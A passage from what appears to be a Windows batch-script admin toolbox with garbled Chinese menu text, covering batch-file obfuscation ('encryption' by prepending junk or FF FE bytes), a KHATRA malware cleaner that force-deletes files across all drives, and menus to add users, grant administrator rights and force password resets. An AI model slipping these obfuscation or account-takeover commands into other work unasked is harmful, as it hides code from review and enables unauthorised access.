for /f "delims=" %%g in ("!jiami!") do if %%~xg==.lrc set geshi=lrc&set wjm=%%~ng&goto beiyongjiami(1)
echo ��Ч���ļ���ʽ��
ping/n 2 0.0>nul
goto batjiami(1)
:beiyongjiami(1)
copy/y "!jiami!" %systemdrive%linshiwenjian.tmp
echo %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a %%%%a>%systemdrive%4.tmp
echo cls>%systemdrive%5.tmp
copy/b %systemdrive%4.tmp+%systemdrive%5.tmp+%systemdrive%linshiwenjian.tmp "%zmlj%�Ѽ��ܵ�%wjm%.%geshi%"
del/f/q %systemdrive%4.tmp
del/f/q %systemdrive%5.tmp
del/f/q %systemdrive%linshiwenjian.tmp
cls
echo _______________________________________________________________________________
echo �������
ping/n 2 0.0>nul
goto batjiami
:batjiami(3)
cls
title �ļ�����(����2)%system%
echo �ļ�����(����2)
echo _______________________________________________________________________________
echo �����ļ�������������(e=����)
echo _______________________________________________________________________________
set jiami2=
set/p jiami2=�϶���Ҫ���ܵ��ļ����˴���:
if /i "!jiami2!"=="e" goto batjiami
if "!jiami2:~0,1!!jiami2:-1!" neq """" for /f "delims=" %%a in ('"echo !jiami2!"') do (set !jiami2!="%%~a")
:jiami2pause
for /f "delims=" %%g in ("!jiami2!") do if %%~xg==.bat set geshi=bat&set wjm=%%~ng&goto jiami2(1)
for /f "delims=" %%g in ("!jiami2!") do if %%~xg==.txt set geshi=txt&set wjm=%%~ng&goto jiami2(1)
for /f "delims=" %%g in ("!jiami2!") do if %%~xg==.log set geshi=log&set wjm=%%~ng&goto jiami2(1)
for /f "delims=" %%g in ("!jiami2!") do if %%~xg==.inf set geshi=inf&set wjm=%%~ng&goto jiami2(1)
for /f "delims=" %%g in ("!jiami2!") do if %%~xg==.cmd set geshi=cmd&set wjm=%%~ng&goto jiami2(1)
for /f "delims=" %%g in ("!jiami2!") do if %%~xg==.ini set geshi=ini&set wjm=%%~ng&goto jiami2(1)
for /f "delims=" %%g in ("!jiami2!") do if %%~xg==.lrc set geshi=lrc&set wjm=%%~ng&goto jiami2(1)
echo ��Ч���ļ���ʽ��
ping/n 2 0.0>nul
goto batjiami(3)
:jiami2(1)
cls
verify on
copy/y "!jiami2!" %systemdrive%temp.0
set /p =//4NCg==<nul>%temp%\tmpcode
certutil -decode -f %temp%\tmpcode %systemdrive%temp>nul
copy/b %systemdrive%temp+%systemdrive%temp.0 "%zmlj%�Ѽ��ܵ�%wjm%.%geshi%"
del/f/q %systemdrive%temp
del/f/q %systemdrive%temp.0
cls
echo _______________________________________________________________________________
echo �������
ping/n 2 0.0>nul
goto batjiami
:13
title DOS������%system%
cls
echo _______________________________________________________________________________
echo ע��:DOS����ֻ�ܽ����������㣬������ֻ�ܾ�ȷ������
echo ��Ч��ֵ��Χ(-2147483648��2147483647)(c=���� e=����)
echo _______________________________________________________________________________
:13(1)
set biaodashi=
set/p biaodashi=��������ʽ:
set biaodashi="%biaodashi:|=%"
if /i !biaodashi!=="c" goto 13
if /i !biaodashi!=="e" goto memuv2
:13(2)
set/a jieguo=%biaodashi%
echo ������:%biaodashi%=%jieguo%
echo _______________________________________________________________________________
goto 13(1)
:14
title ���������ʾ��������%system%
cls
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t reg_dword /d 00000000 /f
echo _______________________________________________________________________________
echo ����������ز˵�&pause>nul
goto memuv2
:15
title �����������%system%
set/a cs=0
cls
echo ˵��:ֻ�������������������Χ(0-32767)(e=���ز˵�)
echo _______________________________________________________________________________
set zuidazhi=
set zuixiaozhi=
set/p zuidazhi=����������������ֵ:
set/p zuixiaozhi=���������������Сֵ:
echo _______________________________________________________________________________
:15(1)
set/a cs+=1
set/a zdzcl=%zuidazhi%+1
set/a suijishu=%random%%%(%zdzcl%-%zuixiaozhi%)+%zuixiaozhi%
echo ��%cs%�β����������:%suijishu%
:15(3)
set tuichusuijishu=
set/p tuichusuijishu=
set tuichusuijishu="%tuichusuijishu:|=%"
if /i !tuichusuijishu!=="e" goto memuv2
if /i !tuichusuijishu!=="|=" goto 15(1)
goto 15(3)
:16
title ���KHATRA����%system%
cls
echo ���������ʼ���KHATRT����&pause>nul
cls
echo ���ڽ���KHATRA��������...
ping/n 2 0.0>nul
:16(4)
set khatra=0
:16(4)(1)
taskkill /f /im xplorer.exe
attrib -s -h -r "%systemdrive%\windows\xplorer.exe"
del/f/q "%systemdrive%\windows\xplorer.exe"
md "%systemdrive%\windows\xplorer.exe"
taskkill /f /im ghost.exe
attrib -s -h -r "%systemdrive%\windows\system\ghost.exe"
del/f/q "%systemdrive%\windows\system\ghost.exe"
md "%systemdrive%\windows\system\ghost.exe"
taskkill /f /im khatra.exe
attrib -s -h -r "%systemdrive%\windows\system32\khatra.exe"
del/f/q "%systemdrive%\windows\system32\khatra.exe"
md "%systemdrive%\windows\system32\khatra.exe"
attrib -s -h -r "%systemdrive%\khatra.exe"
del/f/q "%systemdrive%\khatra.exe"
md "%systemdrive%\khatra.exe"
if not %khatra%==1 set/a khatra=%khatra%+1&goto 16(4)(1)
echo _______________________________________________________________________________
echo ����ɾ��KHATRA����...
echo _______________________________________________________________________________
ping/n 2 0.0>nul
rd/s/q "%systemdrive%\khatra.exe"
rd/s/q "%systemdrive%\windows\xplorer.exe"
rd/s/q "%systemdrive%\windows\system\ghost.exe"
rd/s/q "%systemdrive%\windows\system32\khatra.exe"
rd/s/q "%systemdrive%\windows\k.backup"
rd/s/q "%systemdrive%\windows\system32\ntmsdata"
del/f/q "%systemdrive%\windows\youtube.cab"
del/f/q "%systemdrive%\windows\supermodels.cab"
del/f/q "%systemdrive%\windows\new-screamsaver.com.cab"
del/f/q "%systemdrive%\windows\New WinZip File.cab"
del/f/q "%systemdrive%\windows\New WinRAR ZIP archive.cab"
del/f/q "%systemdrive%\windows\New WinRAR archive.cab"
del/f/q "%systemdrive%\windows\mario675.cab"
del/f/q "%systemdrive%\windows\kavSetupEng3857.cab"
del/f/q "%systemdrive%\windows\fh_antivirussetup6534.cab"
del/f/q "%systemdrive%\windows\CyberWar.cab"
del/f/q "%systemdrive%\windows\khatarnakh.exe"
del/f/q "%systemdrive%\windows\tasks\at1.job"
del/f/q "%systemdrive%\windows\system32\avphost.dll"
del/f/q "%systemdrive%\windows\inf\autoplay.inf"
echo _______________________________________________________________________________
echo ����ȫ��ɨ��...
echo _______________________________________________________________________________
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for /f "delims=" %%a in ('"for %%b in (%sypf%) do dir/a/s/b %%b*.exe"') do if %%~za==486912 attrib -s -h -r "%%a"|del/f/q "%%a"|echo ��ɾ��%%a
for /f "delims=" %%c in ('"for %%d in (%sypf%) do dir/a/s/b %%dautorun.inf"') do if %%~zc==234 attrib -s -h -r "%%c"|del/f/q "%%c"|echo ��ɾ��%%c
for %%k in (%sypf%) do del/f/s/q %%k(Empty).lnk
echo [Version]>%systemdrive%\windows\temp\reg.inf
echo Signature="$CHICAGO$">>%systemdrive%\windows\temp\reg.inf
echo [DefaultInstall]>>%systemdrive%\windows\temp\reg.inf
echo DelReg=del>>%systemdrive%\windows\temp\reg.inf
echo [del]>>%systemdrive%\windows\temp\reg.inf
echo HKCU,Software\Microsoft\Windows\CurrentVersion\Policies\System,Disableregistrytools>>%systemdrive%\windows\temp\reg.inf
rundll32 syssetup,SetupInfObjectInstallAction DefaultInstall 128 %systemdrive%\windows\temp\reg.inf
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL" /v CheckedValue /t reg_dword /d 00000001 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t reg_dword /d 00000000 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer" /v nosetfolders /t reg_dword /d 00000000 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t reg_dword /d 00000000 /f
del/f/q %systemdrive%\windows\temp\reg.inf
if /i "%sypf%"=="c:\" goto shoudong
if /i "%sypf%"=="c:\ " goto shoudong
ping/n 2 0.0>nul
:16(1)
echo _______________________________________________________________________________
set zhucebiaoqingli=
set/p zhucebiaoqingli=ע�����Ҫ�ֶ�����.�Ƿ��ע���(y/n):
set zhucebiaoqingli="%zhucebiaoqingli:|=%"
if /i !zhucebiaoqingli!=="y" goto 16(2)
if /i !zhucebiaoqingli!=="n" goto 16(3)
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto 16(1)
:16(2)
cls
regedit
:16(3)
cls
echo KHATRA����������
echo ����������ز˵�&pause>nul
goto memuv2
:shoudong
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for /f "delims=" %%a in ('"for %%b in (%sypf%) do dir/a/s/b %%b*.exe"') do if %%~za==486912 attrib -s -h -r "%%a"|del/f/q "%%a"|echo ��ɾ��%%a
for /f "delims=" %%c in ('"for %%d in (%sypf%) do dir/a/s/b %%dautorun.inf"') do if %%~zc==234 attrib -s -h -r "%%c"|del/f/q "%%c"|echo ��ɾ��%%c
for %%k in (%sypf%) do del/f/s/q %%k:\(Empty).lnk
goto 16(1)
:17
cls
start regedit
goto memuv2
:18
cls
start control
goto memuv2
:19
cls
start dxdiag
goto memuv2
:20
cls
start compmgmt.msc
goto memuv2
:21
title �û�����%system%
cls
echo _______________________________________________________________________________
echo [1]��ʾ���е��û�
echo [2]�������û�
echo [3]ɾ���û�
echo [4]�����û�Ϊ����Ա
echo [5]ǿ���޸��û�����
echo [6]�鿴�û���Ϣ
echo [7]�����˻�
echo [8]ͣ���˻�
echo [0]���ز˵�
echo _______________________________________________________________________________
choice /c 123456780 /n /m ���������ѡ��:
if "%errorlevel%" equ "1" goto 21(1)
if "%errorlevel%" equ "2" goto 21(2)
if "%errorlevel%" equ "3" goto 21(3)
if "%errorlevel%" equ "4" goto 21(4)
if "%errorlevel%" equ "5" goto 21(5)
if "%errorlevel%" equ "6" goto 21(6)
if "%errorlevel%" equ "7" goto 21(7)
if "%errorlevel%" equ "8" goto 21(8)
if "%errorlevel%" equ "9" goto memuv2
goto 21
set yonghu=
set/p yonghu=���������ѡ��:
set yonghu="%yonghu:|=%"
if !yonghu!=="1" goto 21(1)
if !yonghu!=="2" goto 21(2)
if !yonghu!=="3" goto 21(3)
if !yonghu!=="4" goto 21(4)
if !yonghu!=="5" goto 21(5)
if !yonghu!=="6" goto 21(6)
if !yonghu!=="7" goto 21(7)
if !yonghu!=="8" goto 21(8)
if !yonghu!=="0" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto 21
:21(1)
title ��ʾ���е��û�%system%
cls
echo _______________________________________________________________________________
net user
echo _______________________________________________________________________________
echo ��ǰ�ѵ�¼���û�:%username%
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 21
:21(2)
title �������û�%system%
cls
echo ע��:�������û�����Ϊ��ͨ�û�
echo _______________________________________________________________________________
net user
echo _______________________________________________________________________________
echo ��ǰ�ѵ�¼���û�:%username%
echo _______________________________________________________________________________
set xinyonghuming=
set xinyonghumima=
set/p xinyonghuming=�û���:
set/p xinyonghumima=����:
echo _______________________________________________________________________________
cls
net user %xinyonghuming% %xinyonghumima% /add
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 21
:21(3)
title ɾ���û�%system%
cls
echo _______________________________________________________________________________
net user
echo _______________________________________________________________________________
echo ��ǰ�ѵ�¼���û�:%username%
echo _______________________________________________________________________________
set shanchuyonghu=
set/p shanchuyonghu=������Ҫɾ�����û�:
cls
net user %shanchuyonghu% /del
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 21
:21(4)
title �����û�Ϊ����Ա%system%
cls
echo _______________________________________________________________________________
net user
echo _______________________________________________________________________________
echo ��ǰ�ѵ�¼���û�:%username%
echo _______________________________________________________________________________
set/p tishengyonghu=
set/p tishengyonghu=������Ҫ�������û���:
cls
net localgroup administrators %tishengyonghu% /add
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 21
:21(5)
title ǿ���޸��û�����%system%
cls
echo _______________________________________________________________________________
net user
echo _______________________________________________________________________________
echo ��ǰ�ѵ�¼���û�:%username%
echo _______________________________________________________________________________
set xiougaimima=
set xinmima=
set/p xiougaimima=������Ҫ�޸ĵ��û���:
set/p xinmima=������������:
cls
net user %xiougaimima% %xinmima%
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 21
:21(6)
title �鿴�û���Ϣ%system%
cls
net user
echo _______________________________________________________________________________
echo ��ǰ�ѵ�¼���û�:%username%
echo _______________________________________________________________________________
set chakanyonghuxinxi=
set/p chakanyonghuxinxi=������Ҫ�鿴���û���:
cls
net user %chakanyonghuxinxi%
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 21
:21(7)
title �����˻�%system%
cls
net user
echo _______________________________________________________________________________
echo ��ǰ�ѵ�¼���û�:%username%
echo _______________________________________________________________________________
set jhzh=
set/p jhzh=������Ҫ�������û���:
cls
net user %jhzh% /active:yes
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 21
:21(8)
title ͣ���˻�%system%
cls
net user
echo _______________________________________________________________________________
echo ��ǰ�ѵ�¼���û�:%username%
echo _______________________________________________________________________________
set tyzh=
set/p tyzh=������Ҫ�������û���:
cls
net user %tyzh% /active:no
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 21
:22
cls
start gpedit.msc
goto memuv2
:guanji
title �ػ�ѡ��%system%
color 0a
cls
echo _______________________________________________________________________________
echo [1]�ػ�
echo [2]����
echo [3]ע��
echo [4]����ϵͳ�ػ�
echo [5]�������߹���
echo [6]�ر����߹���
echo [7]��ʾϵͳ�Ͽ��õ�˯��״̬
echo [8]����
echo [9]ѭ����ʾ���Ѽ�ʱ�����Դ����
echo [0]���ز˵�
echo _______________________________________________________________________________
choice /c 1234567890 /n /m ���������ѡ��:
if "%errorlevel%" equ "1" goto guanji(1)
if "%errorlevel%" equ "2" goto guanji(2)
if "%errorlevel%" equ "3" goto guanji(3)
if "%errorlevel%" equ "4" goto guanji(4)
if "%errorlevel%" equ "5" goto guanji(6)
if "%errorlevel%" equ "6" goto guanji(7)
if "%errorlevel%" equ "7" goto guanji(8)
::if "%errorlevel%" equ "8" tsdiscon
if "%errorlevel%" equ "8" rundll32.exe user32.dll LockWorkStation
if "%errorlevel%" equ "9" goto guanji-9
if "%errorlevel%" equ "10" if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
goto guanji
set guanjixuanxiang=
set/p guanjixuanxiang=���������ѡ��:
set guanjixuanxiang="%guanjixuanxiang:|=%"
if !guanjixuanxiang!=="1" goto guanji(1)
if !guanjixuanxiang!=="2" goto guanji(2)
if !guanjixuanxiang!=="3" goto guanji(3)
if !guanjixuanxiang!=="4" goto guanji(4)
if !guanjixuanxiang!=="5" goto guanji(6)
if !guanjixuanxiang!=="6" goto guanji(7)
if !guanjixuanxiang!=="7" goto guanji(8)
if !guanjixuanxiang!=="0" if "!tzwz!" equ "!start!" (goto memuv2) else (goto !tzwz!)
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto guanji
:guanji(1)
title �ػ�%system%
cls
echo �����ùػ�����ʱ����Ч��Χ(0-315360000)��(e=����)
set guanjidaojishi=
set/p guanjidaojishi=
if not defined guanjidaojishi set guanjidaojishi=x
set guanjidaojishi=%guanjidaojishi:|=%
if "!guanjidaojishi!"=="x" shutdown /s /f&goto guanji
if /i !guanjidaojishi!==e goto guanji
if !guanjidaojishi! leq 315360000 goto guanji(1)(1)
echo ������Ч���֣�
ping/n 2 0.0>nul
goto guanji(1)
:guanji(1)(1)
if !guanjidaojishi! geq 0 shutdown /s /f /t %guanjidaojishi%&goto guanji
echo ������Ч���֣�
ping/n 2 0.0>nul
goto guanji(1)
:guanji(2)
title ����%system%
cls
echo ��������������ʱ����Ч��Χ(0-315360000)��(e=����)
set chongqidaojishi=
set/p chongqidaojishi=
if not defined chongqidaojishi set chongqidaojishi=x
set chongqidaojishi=%chongqidaojishi:|=%
if "!chongqidaojishi!"=="x" shutdown /r /f&goto guanji 
if /i !chongqidaojishi!==e goto guanji
if !chongqidaojishi! leq 315360000 goto guanji(2)(1)
echo ������Ч���֣�
ping/n 2 0.0>nul
goto guanji(2)
:guanji(2)(1)
if !chongqidaojishi! geq 0 shutdown /r /f /t %chongqidaojishi%&goto guanji
echo ������Ч���֣�
ping/n 2 0.0>nul
goto guanji(2)
:guanji(3)
title ע��%system%
cls
set zhuxiao=
set/p zhuxiao=�Ƿ�����ע��(y/n):
set zhuxiao="%zhuxiao:|=%"
if /i !zhuxiao!=="y" logoff&goto 00
if /i !zhuxiao!=="n" goto guanji
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto guanji(3)
:guanji(4)
title ����ϵͳ�ػ�%system%
cls
shutdown /a
ping/n 2 0.0>nul
goto guanji
:guanji(6)
title ��������%system%
cls
set size=
set/p size=���������ļ�ռ�����ڴ����(40~100)(Ĭ��100)(e=����):
set size="%size:|=%"
if /i !size!=="e" goto guanji
if /i !size!=="|=" set size=100&goto xm
if "%size:~0,1%%size:~-1%" neq """" for /f "delims=" %%a in ('"echo %size%"') do (set %size%=%%~a)
set size=!size:"=!
if !size! geq 40 if !size! leq 100 goto xm
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto guanji(6)
:xm
powercfg /h /size %size%
echo �ѿ������߹���
ping/n 2 0.0>nul
goto guanji
:guanji(7)
title �ر�����%system%
cls
powercfg -h off
echo �ѹر����߹���
ping/n 2 0.0>nul
goto guanji
:guanji(8)
title ��ʾϵͳ�Ͽ��õ�˯��״̬%system%
cls
powercfg -a
echo _______________________________________________________________________________
echo �����������&pause>nul
goto guanji
:guanji-9
title ѭ����ʾ���Ѽ�ʱ�����Դ����%system%
cls
powercfg /requests
powercfg /waketimers
echo _______________________________________________________________________________
echo ��e���ز˵�
choice /c 1e /t 1 /d 1 >nul
if "%errorlevel%" equ ="2" goto guanji
goto guanji-9
:23
title DOS���������%system%
set cho=1234560
cls
echo _______________________________________________________________________________
echo [1]��ʾ���н���
echo [2]��ʾÿ�����̵ķ���
echo [3]��ʾ����·��
echo [4]��ʾ������ϸ��Ϣ
echo [5]��ʾ���̵�TCP/UDP����
echo;[6]ѭ����ʾCPUռ�����������ٶ�
echo [0]���ز˵�
echo _______________________________________________________________________________
rem ::choice /c 1234560 /n /m ���������ѡ��:
!sel!
if "!shuru!" equ "1" goto 23(1)
if "!shuru!" equ "2" goto 23(2)
if "!shuru!" equ "3" goto 23(6)
if "!shuru!" equ "4" goto 23(10)
if "!shuru!" equ "5" goto 23.1
if "!shuru!" equ "6" goto 23-1
if "!shuru!" equ "7" goto memuv2
if "!shuru!" equ "0" goto memuv2
goto 23
set dosjc=
set/p dosjc=���������ѡ��:
set dosjc="%dosjc:|=%"
if !dosjc!=="1" goto 23(1)
if !dosjc!=="2" goto 23(2)
if !dosjc!=="3" goto 23(6)
if !dosjc!=="4" goto 23(10)
if !dosjc!=="0" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto 23
:23(1)
cls
tasklist
echo _______________________________________________________________________________
echo (e=����)(f=ˢ��)
set jcjs=
set/p jcjs=����Ҫ�����Ľ���PID������:
if not defined jcjs goto 23(1)
set jcjs="%jcjs:|=%"
if /i !jcjs!=="f" goto 23(1)
if /i !jcjs!=="e" goto 23
taskkill /f /im %jcjs%
ping/n 2 0.0>nul
goto 23(1)
:23(2)
cls
tasklist/svc
echo _______________________________________________________________________________
echo (e=����)(f=ˢ��)
set jcfw=
set/p jcfw=����Ҫ�����Ľ���PID������:
if not defined jcfw goto 23(2)
set jcfw="%jcfw:|=%"
if /i !jcfw!=="f" goto 23(2)
if /i !jcfw!=="e" goto 23
taskkill /f /im %jcfw%
ping/n 2 0.0>nul
goto 23(2)
:23(6)
title ��ʾ����·��%system%
cls
tasklist
echo _______________________________________________________________________________
echo (e=����)(f=ˢ��)
set jclj=
set/p jclj=����Ҫ��ʾ�Ľ���PID:
if not defined jclj goto 23(1)
set jclj="%jclj:|=%"
if /i !jclj!=="f" goto 23(1)
if /i !jclj!=="e" goto 23
tasklist /fi "pid eq %jclj%"|findstr /i "%jclj%"||echo û�д˽���&&timeout /t 2 /nobreak>nul&&goto 23(6)
cls
for /f "delims=" %%a in ('"wmic process where processid=!jclj! get /format:value|find /i "executablepath""') do set jclj1=%%a
echo �ļ�·��: %jclj1:~15%
echo _______________________________________________________________________________
echo (e=����)(f=ˢ��)(d=���ļ�λ��)
choice /c efd /n /m ���������ѡ��:
if "%errorlevel%" equ "1" goto 23(6)
if "%errorlevel%" equ "2" goto 23
if "%errorlevel%" equ "3" goto 23(8)
goto 23(7)
set jcljxs=
set/p jcljxs=���������ѡ��:
if not defined jcljxs goto 23(6)
set jcljxs="%jcljxs:|=%"
if /i !jcljxs!=="f" goto 23(6)
if /i !jcljxs!=="e" goto 23
if /i !jcljxs!=="d" goto 23(8)
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto 23(7)
:23(8)
explorer/select,"%jclj1:~15%"
goto 23
:23(10)
title ��ʾ������ϸ��Ϣ%system%
cls
echo _______________________________________________________________________________
tasklist
echo _______________________________________________________________________________
echo (e=����)(f=ˢ��)
set jcxq=
set/p jcxq=������Ҫ��ʾ�Ľ��̵�PID:
if not defined jcxq goto 23(10)
set jcxq="%jcxq:|=%"
if /i !jcxq!=="e" goto 23
if /i !jcxq!=="f" goto 23(10)
tasklist /fi "pid eq %jcxq%"|findstr /i "%jcxq%"||echo û�д˽���&&timeout /t 2 /nobreak>nul&&goto 23(10)
cls
echo _______________________________________________________________________________
set jcmz=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "caption""') do set jcmz=%%a
echo ��������:		!jcmz:~8!
set jcmlh=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "commandline""') do set jcmlh=%%a
echo ����������:		!jcmlh:~12!
set jcrq=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "creationdate""') do set jcrq=%%a
echo ������������:		!jcrq:~13,4!��!jcrq:~17,2!��!jcrq:~19,2!�� !jcrq:~21,2!:!jcrq:~23,2!:!jcrq:~25,2!
set jclj=
set jclj1=
for /f "skip=2 tokens=2 delims==" %%a in ('"wmic process where processid=!jcxq! get executablepath /format:value"') do (
set jclj=%%a
call :zfccd "!jclj!"
set /a zfcgs-=1
for /l %%b in (0,1,!zfcgs!) do (if "!jclj:~%%b,1!" neq "" set jclj1=!jclj1!!jclj:~%%b,1!))
echo;����·��:		"!jclj1!"
set jcpid=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "processid""') do set jcpid=%%a
echo ����PID:		!jcpid:~10!
set jchx=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "kernelmodetime""') do set jchx=%%a
echo ���̺���ģʽʱ��:	!jchx:~15!
echo ϵͳ����:		!system:~3! !bit!λ
set jcymcw=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "pagefaults""') do set jcymcw=%%a
echo ����ҳ�����:		!jcymcw:~12!
set jcfid=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "parentprocessid""') do set jcfid=%%a
echo ���̸�ϵPID:		!jcfid:~16!
set jcysy=
for /f "tokens=2 delims==" %%a in ('"wmic process where processid=!jcxq! get PageFileUsage /format:value"') do set jcysy=%%a
call :xdwjs !jcysy! kb dw
echo ����ҳ���ļ�ʹ��:	!dw!
set jcxcs=
for /f "tokens=2 delims==" %%a in ('"wmic process where processid=!jcxq! get ThreadCount /format:value"') do set jcxcs=%%a
echo �����߳���:		!jcxcs!
set jcyxj=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "priority""') do set jcyxj=%%a
echo �������ȼ�:		!jcyxj:~9!
set jchhid=
for /f "delims=" %%a in ('"wmic process where processid=!jcxq! get /format:value|find /i "sessionid""') do set jchhid=%%a
echo ���̻ػ�ID:		!jchhid:~10!
tasklist /fi "pid eq %jcxq%" /m
ver
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 23
:23.1
title ��ʾTCP/UDP����%system%
cls
netstat -aon
echo _______________________________________________________________________________
echo (e=����)(f=ˢ��)
set �ַ���=
set /p �ַ���=����Ҫ���ҵ��ַ���: 
if not defined �ַ��� (goto 23.1)
if "!�ַ���!" equ "e" (goto 23)
if "!�ַ���!" equ "f" (goto 23.1)
cls
netstat -aon|findstr /i /c:"!�ַ���!"
echo _______________________________________________________________________________
set /p =�����������<nul&pause>nul
goto 23
:23-1
color 0f
set ysbak=97;40m
title ѭ����ʾCPUռ�����������ٶ�%system%
cls
echo;���ڻ�ȡ������Ϣ...
for /f "tokens=2 delims==" %%a in ('"Wmic path Win32_PerfFormattedData_Tcpip_NetworkInterface get name /value"') do (
    set netcard=%%a
)
for /f "tokens=2 delims==" %%a in ('"wmic cpu get numberOflogicalprocessors /value"') do (
    set corenum=%%a
    set /a tghs=corenum*2+4+2
)
for /f "tokens=2 delims==" %%a in ('"wmic cpu get name /value"') do (
    set cpu=%%a
)
cls
:23-1-1
(
set xh=
for /f "tokens=2 delims==" %%a in ('"Wmic path Win32_PerfFormattedData_Tcpip_NetworkInterface get BytesReceivedPersec^,BytesSentPersec /value"') do (
    set /a "xh+=1"
    if !xh! equ 1 (
        set downspeed=%%a
    )
    if !xh! equ 2 (
        set upspeed=%%a
        for /f "skip=%tghs% tokens=2 delims==" %%a in ('"Wmic Path Win32_PerfFormattedData_PerfOS_Processor Get PercentIdleTime /value"') do (
            set /a lyl=100-%%a
        )
    )
)
call :xdwjs !upspeed! b upspeed
call :xdwjs !downspeed! b downspeed
echo;!netcard!
echo;
(echo;�ϴ��ٶ�:  !upspeed!/s �����ٶ�:   !downspeed!/s   	)
echo;
echo;!cpu!
echo;
set /p =CPU����������:  <nul
if !lyl! leq 25 (
    call :rgb 12.12.12 0.255.0 !lyl!
) else (
    if !lyl! leq 50 (
        call :rgb 12.12.12 255.255.0 !lyl!
    ) else (
        if !lyl! leq 75 (
            call :rgb 12.12.12 255.127.0 !lyl!
        ) else (
            call :rgb 12.12.12 255.0.0 !lyl!
        )
    )
)
set /p =%%  <nul
echo;
echo;_______________________________________________________________________________
echo;��e���ز˵�
set /p =!cswz!s!cswz!0;0H<nul
choice /c 1e /t 1 /d 1 >nul
if "!errorlevel!" equ ="2" goto 23
goto 23-1-1
)
:24
title �ļ�ϵͳ��Ϣ��ѯ%system%
cls
echo _______________________________________________________________________________
echo [1]�г�����������
echo [2]��ѯһ��������������
echo [3]��ѯ����Ϣ
echo [4]��ѯNTFS����Ϣ
echo [5]��ѯREFS����Ϣ
echo [6]��ѯ������Ϣ
echo [0]���ز˵�
echo _______________________________________________________________________________
choice /c 1234560 /n /m ���������ѡ��:
if "%errorlevel%" equ "1" goto 24(1)
if "%errorlevel%" equ "2" goto 24(2)
if "%errorlevel%" equ "3" goto 24(3)
if "%errorlevel%" equ "4" goto 24(4)
if "%errorlevel%" equ "5" goto 24(5)
if "%errorlevel%" equ "6" goto 24(6)
if "%errorlevel%" equ "7" goto memuv2
goto 24
set wjsystem=
set/p wjsystem=���������ѡ��:
set wjsystem="%wjsystem:|=%"
if !wjsystem!=="1" goto 24(1)
if !wjsystem!=="2" goto 24(2)
if !wjsystem!=="3" goto 24(3)
if !wjsystem!=="4" goto 24(4)
if !wjsystem!=="5" goto 24(5)
if !wjsystem!=="6" goto 24(6)
if !wjsystem!=="0" goto memuv2
echo ��������ȷ��ѡ�
ping/n 2 0.0>nul
goto 24
:24(1)
titel �г�����������
cls
fsutil fsinfo drives
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 24
:24(2)
title ��ѯһ��������������%system%
cls
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set qdqlx=
set/p qdqlx=������Ҫ��ѯ��������:
cls
fsutil fsinfo drivetype %qdqlx%:
echo _______________________________________________________________________________
echo �����������&pause>nul
goto 24
:24(3)
title ��ѯ����Ϣ%system%
cls
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set juanxx=
set/p juanxx=������Ҫ��ѯ��������:
cls
fsutil fsinfo volumeinfo %juanxx%:
